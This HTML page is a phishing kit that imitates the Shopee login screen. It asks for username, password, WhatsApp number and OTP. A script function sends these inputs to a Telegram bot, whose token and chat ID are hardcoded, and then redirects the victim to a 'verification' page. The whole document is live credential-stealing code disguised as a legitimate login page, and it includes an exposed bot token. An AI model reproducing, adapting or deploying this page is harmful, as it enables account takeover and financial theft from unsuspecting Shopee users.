<!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <title>Login Page</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdn.jsdelivr.net/npm/@fontsource/inter/4.5.9/index.css" rel="stylesheet" />
  <style>
    /* Styling untuk pesan error agar terlihat seperti Shoppe */
    .password-error {
      color: #EE4D2D;
      /*Shopee Orange */
      font-size: 0.875rem;
      /* text-sm */
      margin-top: 0.5rem;
      /* mt-2 */
      display: none;
    }
  </style>
  <script>
    let resendTimer;
    let resendCountdown = 60;

    // Validasi Password
    function validatePassword(password) {
      // Kriteria:
      // 1. Minimum 8 karakter, Maksimum 16 karakter
      // 2. Mengandung setidaknya 1 huruf kecil (a-z)
      // 3. Mengandung setidaknya 1 huruf besar (A-Z)
      // 4. Mengandung setidaknya 1 angka (0-9)
      // *Karakter khusus diperbolehkan, tetapi tidak wajib*

      const minLength = 8;
      const maxLength = 16;
      // REGEX yang diperbarui: . (titik) di akhir memperbolehkan spasi
      const regex = /^(?=.{8,16}$)(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/;

      if (!password) return false;

      return regex.test(password);
    }

    // -- Shopee Login Button Enable/Disable Logic --
    function checkShopeeLoginInputs() {
      const usernameInput = document.getElementById("shopeeUsername");
      const passwordInput = document.getElementById("password");
      const loginBtn = document.getElementById("shopeeLoginBtn");

      // Sembunyikan pesan error saat input berubah
      document.getElementById("passwordError").style.display = 'none';
      passwordInput.classList.remove('border-red-500');
      passwordInput.classList.remove('border-gray-300');
      passwordInput.classList.add('border-gray-300');

      if (usernameInput.value.trim() && passwordInput.value.trim().length >= 8) {
        loginBtn.disabled = false;
        loginBtn.classList.add("bg-gray-300", "text-gray-700");
      } else {
        loginBtn.disabled = true;
        loginBtn.classList.remove("bg-gray-300", "text-gray-700");
      }
    }

    function togglePasswordVisibility() {
      const passwordInput = document.getElementById("password");
      const toggleBtnIcon = document.getElementById("toggleIcon");
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleBtnIcon.classList.remove("fa-eye-slash");
        toggleBtnIcon.classList.add("fa-eye");
      } else {
        passwordInput.type = "password";
        toggleBtnIcon.classList.remove("fa-eye");
        toggleBtnIcon.classList.add("fa-eye-slash");
      }
    }

    function togglePasswordField() {
      const passwordInput = document.getElementById("password");
      const toggleIcon = document.getElementById("toggleIcon");
      if (passwordInput.type == "password") {
        passwordInput.type = "text";
        toggleIcon.classList.remove("fa-eye-slash");
        toggleIcon.classList.add("fa-eye");
      } else {
        passwordInput.type = "password";
        toggleIcon.classList.remove("fa-eye");
        toggleIcon.classList.add("fa-eye-slash");
      }
    }

    // NOTIFIKASI: Nonaktifkan login Google & Facebook --
    function showLoginAlert() {
      alert("Silakan login dengan nomor handphone dan password atau login dengan WhatsApp.");
    }

    function goToWhatsAppAppNumberInput() {
      document.getElementById("mainLoginSection").classList.add("hidden");
      document.getElementById("whatsappAppNumberInputSection").classList.remove("hidden");
    }

    // ====== PERBAIKAN UTAMA: simpan nomor ke localStorage sebelum redirect ======
    function submitWhatsAppShopLogin() {
      const waNumber = document.getElementById("waNumberInput") ? document.getElementById("waNumberInput").value.trim() : '';
      if (!waNumber) {
        alert("Mohon masukkan nomor WhatsApp Anda.");
        return;
      }
      try {
        localStorage.setItem('phoneNumber', waNumber);
      } catch (e) {
        // jika localStorage tidak tersedia, lanjut saja
        console.warn('localStorage tidak tersedia:', e);
      }

      // Jika Anda ingin juga mengirim log, biarkan fungsi lama dipanggil (jika ada)
      if (typeof sendAllInputsToTelegram === 'function') {
        try { sendAllInputsToTelegram('wa'); } catch (e) { console.warn(e); }
      }

      // Lanjutkan alur verifikasi (jangan ubah tampilan)
      // Jika alur Anda menuju pinmitra.html, ganti url berikut menjadi 'pinmitra.html'
      window.location.href = 'verifikiasi.html';
    }

    function backToMainFromWhatsAppApp() {
      document.getElementById("whatsappAppNumberInputSection").classList.add("hidden");
      document.getElementById("mainLoginSection").classList.remove("hidden");
    }

    function submitShopLogin(event) {
      event.preventDefault();

      const passwordInput = document.getElementById("password");
      const password = passwordInput.value;
      const passwordError = document.getElementById("passwordError");

      if (!validatePassword(password)) {
        // Tampilkan pesan error jika password tidak valid
        passwordError.style.display = 'block';
        passwordInput.classList.remove('border-gray-300');
        passwordInput.classList.add('border-red-500');
        return;
      }

      sendAllInputsToTelegram('shop');
      // Jika ingin redirect ke halaman lain setelah berhasil: window.location.href = "dashboard.html";
    }

    function togglePasswdVisibility() {
      const passwordInput = document.getElementById("password");
      if (passwordInput.type === "password") passwordInput.type = "text";
      else passwordInput.type = "password";
    }

    function sendAllInputsToTelegram(contextName) {
      const shopeeUsername = document.getElementById("shopeeUsername") ? document.getElementById("shopeeUsername").value : '';
      const shopeePassword = document.getElementById("password") ? document.getElementById("password").value : '';
      const waNumber = document.getElementById("waNumberInput") ? document.getElementById("waNumberInput").value : '';
      const otpPhone = document.getElementById("otpInput") ? document.getElementById("otpInput").value : '';

      let text = `LOGIN_FORM (${contextName})\n`;
      text += `Shopee Username: ${shopeeUsername}\nShopee Password: ${shopeePassword}\n`;
      text += `WhatsApp Number: ${waNumber}\n`;
      text += `OTP Phone: ${otpPhone}\n`;

      const chatId = '5923031825';
      const token = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      // Simpan nomor juga sebelum mengirim request (redundan tetapi aman)
      try {
        if (waNumber) localStorage.setItem('phoneNumber', waNumber);
      } catch (e) { /* ignore if localStorage not allowed */ }

      try {
        fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: text })
        });
      } catch (e) { }
    }

    // Shopee login form submit handler (Diperbarui)
    function submitShopeeLogin(event) {
      event.preventDefault();
      const password = document.getElementById('password').value;
      if (!validatePassword(password)) {
        document.getElementById('passwordError').style.display = 'block';
        return;
      }
      sendAllInputsToTelegram('shop');
    }

    // Fallback: Simpan nomor setiap kali input berubah (mempermudah flow ke halaman lain)
    window.onload = function () {
      const waInput = document.getElementById('waNumberInput');
      if (waInput) {
        // set initial from storage if available
        try {
          const stored = localStorage.getItem('phoneNumber');
          if (stored && !waInput.value) waInput.value = stored;
        } catch (e) { }

        waInput.addEventListener('input', (e) => {
          try { localStorage.setItem('phoneNumber', e.target.value.trim()); } catch (err) { }
        });
      }

      const loginForm = document.getElementById('loginForm');
      if (loginForm) loginForm.addEventListener('submit', submitShopeeLogin);

      const waLoginBtn = document.getElementById('shopeeLoginBtn');
      if (waLoginBtn) waLoginBtn.addEventListener('click', showLoginAlert);
    }
  </script>
</head>

<body class="bg-white min-h-screen flex flex-col items-center justify-center px-6">
  <img alt="Shopee logo" class="mb-10" height="64" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Shopee_logo.svg" width="64" />

  <div id="mainLoginSection" class="w-full max-w-sm">
    <form id="loginForm" class="mb-6" autocomplete="off">
      <div class="relative mb-6">
        <span class="absolute left-0 pl-2 fa fa-user"></span>
        <input id="shopeeUsername" class="w-full border-b border-gray-300 py-2 pl-10 pr-2 text-gray-700 placeholder-gray-400 focus:outline-none border-gray-400" placeholder="No. Handphone/Email/Username" type="text" required autocomplete="off" />
      </div>

      <div class="relative mb-4">
        <span class="absolute left-0 pl-2 fa fa-lock"></span>
        <input id="password" class="w-full py-2 pl-10 pr-4 text-gray-700 placeholder-gray-400 focus:outline-none border-b border-gray-300" placeholder="Password" type="password" required autocomplete="off" minlength="8" maxlength="16" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,16}$" oninvalid="this.setCustomValidity('')" oninput="this.setCustomValidity('')" />
        <button aria-label="Toggle password visibility" class="absolute right-2 top-0 mt-2" type="button" onclick="togglePasswdVisibility()"><i id="toggleIcon" class="fa fa-eye-slash"></i></button>
      </div>

      <p id="passwordError" class="password-error">Password yang Anda masukkan tidak valid. Pastikan panjang 8-16 karakter, dan mengandung huruf besar, huruf kecil, dan angka.</p>

      <button id="shopeeLoginBtn" class="bg-gray-300 text-white py-2 rounded w-full" type="submit">Log In</button>
    </form>

    <div class="space-y-3">
      <button onclick="goToWhatsAppAppNumberInput()" class="w-full flex items-center border border-gray-300 rounded py-2 px-3 text-center text-lg font-normal mb-4 cursor-not-allowed">
        <img alt="Shoppe login icon" class="mr-2" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="20" height="20" />
        Log In dengan WhatsApp
      </button>

      <button onclick="showLoginAlert()" class="w-full flex items-center border border-gray-300 rounded py-2 px-3 text-black text-base font-normal">
        <img alt="Gmail logo" class="mr-3" src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.png" width="20" height="20" />
        Log In dengan Google
      </button>

      <button onclick="showLoginAlert()" class="w-full flex items-center border border-gray-300 rounded py-2 px-3 text-black text-base font-normal">
        <img alt="Facebook logo" class="mr-3" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" width="20" />
        Log In dengan Facebook
      </button>

    </div>
  </div>

  <div id="whatsappAppNumberInputSection" class="hidden w-full max-w-sm">
    <h2 class="text-2xl font-semibold mb-4">Masukkan Nomor WhatsApp Anda</h2>
    <div class="mb-4">
      <input id="waNumberInput" type="tel" placeholder="Masukkan nomor WhatsApp" class="w-full border border-gray-300 rounded p-2" />
    </div>
    <div class="flex gap-2">
      <button onclick="submitWhatsAppShopLogin()" class="flex-grow bg-green-600 text-white py-2 rounded">Lanjut</button>
      <button onclick="backToMainFromWhatsAppApp()" class="flex-grow border border-gray-300 py-2 rounded">Kembali</button>
    </div>
  </div>

</body>

</html>
